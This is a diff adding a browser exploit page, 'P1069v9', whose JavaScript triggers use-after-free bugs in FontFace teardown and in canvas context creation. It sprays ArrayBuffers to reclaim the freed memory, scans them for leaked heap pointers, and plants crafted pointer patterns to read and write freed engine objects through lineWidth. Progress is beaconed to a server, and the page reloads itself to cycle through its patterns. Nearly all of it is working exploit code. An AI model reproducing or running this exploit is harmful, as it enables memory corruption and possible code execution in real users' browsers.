@@ -1,0 +1,323 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1069v9 - FL Stabilized + Pattern Diagnostic</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8c8d0;font:12px/1.5 'Courier New',monospace;padding:10px}
+h2{color:#00ff88;font-size:14px;margin:6px 0}
+#log{background:#12121a;border:1px solid #2a2a3a;border-radius:6px;padding:8px;margin:6px 0;
+max-height:75vh;overflow-y:auto;font-size:11px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}
+.hit{color:#ff00ff;font-weight:bold}.ptr{color:#ff0;font-weight:bold}
+</style>
+</head><body>
+<h2>P1069v9 FL Stabilized + Pattern Diagnostic</h2>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),T0=Date.now();
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1069v9-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+var _bu64;try{_bu64=new BigUint64Array(_b8);}catch(e){}
+function f2hex(v){if(_bu64){_f64[0]=v;return '0x'+_bu64[0].toString(16);}
+_f64[0]=v;return '0x'+_u32[1].toString(16).padStart(8,'0')+_u32[0].toString(16).padStart(8,'0');}
+
+/* ══════════════════════════════════════════════════════════
+   P1069v9 — FIX for v8 crash loop (0/25 FL, never completes):
+
+   ROOT CAUSE: v8 filled 144 spray buffers with 0xBB byte-by-byte
+   INSIDE the FontFace 'then' getter (during font teardown). The
+   fill loop widened the UAF race window: the engine touched the
+   freed font object before reclaim buffers landed → process died
+   inside the getter, before any scan beacon → silent BOOT loop.
+
+   FIXES:
+   1. Zero-init spray (v7 style, no fill) — fast reclaim, v7 hit 2/9.
+   2. Pattern A_allzero needs NO leak → runs immediately, no FL gate.
+   3. Heartbeat beacons (FL-CB / FL-SCANn / FL-FOUND) so a silent
+      death is localizable.
+   4. Watchdog: FL callback must fire within 6s else FL-WATCHDOG+reload.
+   5. FL failure budget: 10 consecutive FL fails per pattern →
+      FL-BLOCKED, advance. State machine ALWAYS reaches ALL-DONE.
+   ══════════════════════════════════════════════════════════ */
+
+var PATTERNS=['A_allzero','B_allptr','C_ptr0_zero112','D_zero0_ptr112'];
+var patIdx=0;
+try{patIdx=parseInt(localStorage.getItem('p1069v9_idx')||'0');}catch(e){}
+
+var results={};
+try{var r=localStorage.getItem('p1069v9_res');if(r)results=JSON.parse(r);}catch(e){}
+
+var flFails=0;
+try{flFails=parseInt(localStorage.getItem('p1069v9_flf')||'0');}catch(e){}
+
+/* mark prev pattern as crashed if it died mid-test */
+if(patIdx>0 && patIdx<=PATTERNS.length && results[PATTERNS[patIdx-1]]==='TESTING'){
+  results[PATTERNS[patIdx-1]]='CRASHED';
+  try{localStorage.setItem('p1069v9_res',JSON.stringify(results));}catch(e){}
+}
+
+function saveState(){
+  try{localStorage.setItem('p1069v9_res',JSON.stringify(results));
+  localStorage.setItem('p1069v9_idx',''+patIdx);
+  localStorage.setItem('p1069v9_flf',''+flFails);}catch(e){}
+}
+
+/* ════════ completion ════════ */
+if(patIdx>=PATTERNS.length){
+  var summary=PATTERNS.map(function(p){return p+'='+(results[p]||'?');}).join(' | ');
+  log('ALL PATTERNS TESTED!','hit');
+  B('ALL-DONE',summary);
+  log(summary,'info');
+  if(results['D_zero0_ptr112'] && results['D_zero0_ptr112'].indexOf('READ:')===0){
+    log('*** PATTERN D SUCCEEDED — NO VTABLE DISPATCH! ***','hit');
+    B('VICTORY','pattern_D_works');
+  }
+  try{localStorage.setItem('p1069v9_idx','0');
+  localStorage.removeItem('p1069v9_res');
+  localStorage.removeItem('p1069v9_flf');}catch(e){}
+} else {
+
+var curPat=PATTERNS[patIdx];
+B('BOOT','idx='+patIdx+'|pat='+curPat+'|flf='+flFails);
+log('=== P1069v9: Pattern '+curPat+' ('+patIdx+'/'+PATTERNS.length+') flFails='+flFails+' ===','info');
+var prev=PATTERNS.filter(function(k){return results[k];});
+if(prev.length>0){log('Prev: '+prev.map(function(k){return k+'='+results[k];}).join(', '),'info');}
+
+/* ════════ FRESH FontFace Leak (v7-style fast spray + heartbeats) ════════ */
+function freshFontFaceLeak(cb){
+  B('FL-START');
+  var done=false;
+  var watchdog=setTimeout(function(){
+    if(done)return; done=true;
+    B('FL-WATCHDOG','cb never fired (died in getter?)');
+    log('FL: WATCHDOG — callback never fired','err');
+    flFails++; saveState();
+    setTimeout(function(){location.reload(true);},400);
+  },6000);
+
+  function finish(found){
+    if(done)return; done=true;
+    clearTimeout(watchdog);
+    try{delete FontFace.prototype.then;}catch(e){}
+    cb(found);
+  }
+
+  try{
+    var K=10,firedHere=false,styleEl;
+    var A=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+    document.fonts.add(A);void A.loaded;
+    styleEl=document.createElement('style');
+    styleEl.textContent="@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}";
+    document.head.appendChild(styleEl);
+    Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+      get:function(){
+        if(firedHere)return undefined;firedHere=true;
+        if(styleEl)styleEl.remove();
+        try{document.fonts.delete(this);}catch(e){}
+        document.body.offsetHeight;
+        window.__map=[];
+        /* v7-style: zero-init spray, NO fill loop (fast reclaim) */
+        var szArr=[64,96,128,160,192,224,256,320,384,512,768,1024];
+        for(var si=0;si<szArr.length;si++){var sz=szArr[si];
+          for(var k=0;k<K;k++){var ab=new ArrayBuffer(sz);
+            window.__map.push({size:sz,view:new Uint8Array(ab)});}}
+        try{document.fonts.check('1em s0');}catch(e){}
+        return undefined;
+      },set:function(){}});
+    document.fonts.load('1em f0, s0','AB');
+    setTimeout(function(){
+      B('FL-CB','scanning');
+      var found=null;
+      for(var pass=0;pass<3&&!found;pass++){
+        B('FL-SCAN'+pass,'');
+        for(var i=0;i<window.__map.length&&!found;i++){
+          var e=window.__map[i];if(e.size!==192)continue;
+          var nz=false;
+          for(var b=0x58;b<0x60;b++)if(e.view[b])nz=true;
+          if(nz){
+            var dv=new DataView(e.view.buffer);
+            var p1bi=dv.getBigUint64(0x58,true);
+            var p2bi=dv.getBigUint64(0x68,true);
+            if(p1bi>0x1000000000n && p1bi<0x100000000000n){
+              found={p1:'0x'+p1bi.toString(16),p2:'0x'+p2bi.toString(16),
+                     p1lo:Number(p1bi&0xFFFFFFFFn),p1hi:Number((p1bi>>32n)&0xFFFFFFFFn)};
+              log('FL: p1='+found.p1+' p2='+found.p2,'ptr');
+              B('FL-HIT','p1='+found.p1+'|p2='+found.p2);
+              /* deep scan: nonzero qwords in zero-init buffer = engine data */
+              for(var off=0;off+7<192;off+=8){
+                var qw=dv.getBigUint64(off,true);
+                if(qw!==0n){
+                  var isHeap=(qw>0x1000000000n && qw<0x100000000000n);
+                  B('FL-QWORD','off='+off+'|val=0x'+qw.toString(16)+'|heap='+isHeap);
+                }
+              }
+            }
+          }
+        }
+        if(!found&&pass<2){var t=Date.now();while(Date.now()-t<200){}}
+      }
+      if(!found){log('FL: miss','warn');B('FL-MISS');flFails++;saveState();}
+      else {flFails=0;saveState();}
+      finish(found);
+    },80);
+  }catch(e){
+    log('FL: error '+e,'err');B('FL-ERR',e.message);
+    flFails++;saveState();
+    finish(null);
+  }
+}
+
+/* ════════ Fill AB with selected pattern ════════ */
+function fillPattern(ab, patName, ptrLo, ptrHi){
+  var dv=new DataView(ab);
+  var sz=ab.byteLength;
+  if(patName==='A_allzero'){return;} /* zero-init already */
+  if(patName==='B_allptr'){
+    for(var off=0;off+7<sz;off+=8){
+      dv.setUint32(off,ptrLo,true);dv.setUint32(off+4,ptrHi,true);}
+    return;
+  }
+  if(patName==='C_ptr0_zero112'){
+    dv.setUint32(0,ptrLo,true);dv.setUint32(4,ptrHi,true);
+    return;
+  }
+  if(patName==='D_zero0_ptr112'){
+    dv.setUint32(112,ptrLo,true);dv.setUint32(116,ptrHi,true);
+    dv.setUint32(120,1,true);dv.setUint32(124,1,true);
+    return;
+  }
+}
+
+/* ════════ Reclaim + Diagnostic Test ════════ */
+function phaseTest(leak){
+  var sz=768;
+  var p1s=leak?leak.p1:'0x0';
+  B('TEST-TRY','pat='+curPat+'|sz='+sz+'|p1='+p1s);
+
+  var canvas=document.createElement('canvas');
+  canvas.width=1;canvas.height=1;
+  var innerCtx=null;
+  var opts={};
+  Object.defineProperty(opts,'alpha',{configurable:true,
+    get:function(){innerCtx=canvas.getContext('2d');return true;}
+  });
+  canvas.getContext('bitmaprenderer',opts);
+  delete opts.alpha;opts=null;
+
+  if(!innerCtx){
+    B('TEST-NOINNER');results[curPat]='NOINNER';patIdx++;saveState();
+    setTimeout(function(){location.reload(true);},300);return;
+  }
+  B('TEST-UAF-OK');
+
+  var ptrLo=leak?leak.p1lo:0, ptrHi=leak?leak.p1hi:0;
+  var abs=[];
+  for(var i=0;i<600;i++){
+    var ab=new ArrayBuffer(sz);
+    fillPattern(ab, curPat, ptrLo, ptrHi);
+    abs.push(ab);
+  }
+  B('TEST-SPRAY','pat='+curPat+'|n=600');
+
+  /* T1: typeof (pure JS) */
+  var t1='?';
+  try{t1=typeof innerCtx;}catch(e){t1='ERR:'+e.message;}
+  B('T1-TYPEOF','val='+t1);
+
+  /* T2: constructor name (JS prototype chain) */
+  var t2='?';
+  try{t2=innerCtx.constructor?innerCtx.constructor.name:'null';}catch(e){t2='ERR:'+e.message;}
+  B('T2-CTOR','val='+t2);
+
+  /* T3: property existence (no C++ deref) */
+  var t3='?';
+  try{t3=('lineWidth' in innerCtx)?'YES':'NO';}catch(e){t3='ERR:'+e.message;}
+  B('T3-HASPROP','val='+t3);
+
+  B('PRE-LINEWIDTH','pat='+curPat);
+  log('>>> lineWidth with pattern '+curPat+'...','warn');
+
+  /* T4: the dangerous read — mark TESTING then advance so crash records right */
+  results[curPat]='TESTING';
+  try{localStorage.setItem('p1069v9_idx',''+(patIdx+1));
+  localStorage.setItem('p1069v9_res',JSON.stringify(results));}catch(e){}
+
+  var lw,crashed=false,errMsg='';
+  try{lw=innerCtx.lineWidth;}catch(e){crashed=true;errMsg=e.message||'?';}
+
+  if(crashed){
+    results[curPat]='CAUGHT:'+errMsg;
+    try{localStorage.setItem('p1069v9_res',JSON.stringify(results));}catch(e){}
+    B('LW-CAUGHT','pat='+curPat+'|err='+errMsg);
+    setTimeout(function(){location.reload(true);},300);return;
+  }
+
+  var hex=f2hex(lw);
+  B('LW-READ','pat='+curPat+'|lw='+lw+'|hex='+hex);
+  log('*** lineWidth READ: '+lw+' ('+hex+') pat='+curPat+' ***','hit');
+
+  if(lw===1.0){results[curPat]='DEFAULT:1.0';}
+  else{
+    results[curPat]='READ:'+hex;
+    try{innerCtx.lineWidth=88888.88;var lw2=innerCtx.lineWidth;
+      B('LW-WRITE','lw2='+lw2+'|hex2='+f2hex(lw2));
+      results[curPat]+='|W:'+f2hex(lw2);}catch(e){B('LW-WRITE-ERR',e.message);}
+    try{var ga=innerCtx.globalAlpha;var ml=innerCtx.miterLimit;
+      B('PROPS','ga='+f2hex(ga)+'|ml='+f2hex(ml));}catch(e){B('PROPS-ERR',e.message);}
+  }
+  try{localStorage.setItem('p1069v9_res',JSON.stringify(results));
+  localStorage.setItem('p1069v9_idx',''+(patIdx+1));}catch(e){}
+  B('DONE','pat='+curPat+'|result='+results[curPat]);
+  log('=== DONE: '+curPat+' = '+results[curPat]+' ===','ok');
+  setTimeout(function(){location.reload(true);},500);
+}
+
+/* ════════ MAIN: pattern A needs no leak; B/C/D gated on FL with budget ════════ */
+if(curPat==='A_allzero'){
+  log('Pattern A: no leak needed — running directly','info');
+  setTimeout(function(){phaseTest(null);},100);
+} else if(flFails>=10){
+  log('FL blocked ('+flFails+' fails) — marking '+curPat+' FL-BLOCKED, advancing','err');
+  results[curPat]='FL-BLOCKED';flFails=0;
+  try{localStorage.setItem('p1069v9_idx',''+(patIdx+1));}catch(e){}
+  saveState();
+  B('FL-BLOCKED','pat='+curPat);
+  setTimeout(function(){location.reload(true);},300);
+} else {
+  freshFontFaceLeak(function(leak){
+    if(!leak){
+      B('FL-MISS-RELOAD');
+      setTimeout(function(){location.reload(true);},500);return;
+    }
+    setTimeout(function(){phaseTest(leak);},100);
+  });
+}
+
+} /* end patIdx<PATTERNS.length */
+
+/* auto-reload check */
+(function(){
+  var cur='P1069v9-fl-stabilized';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
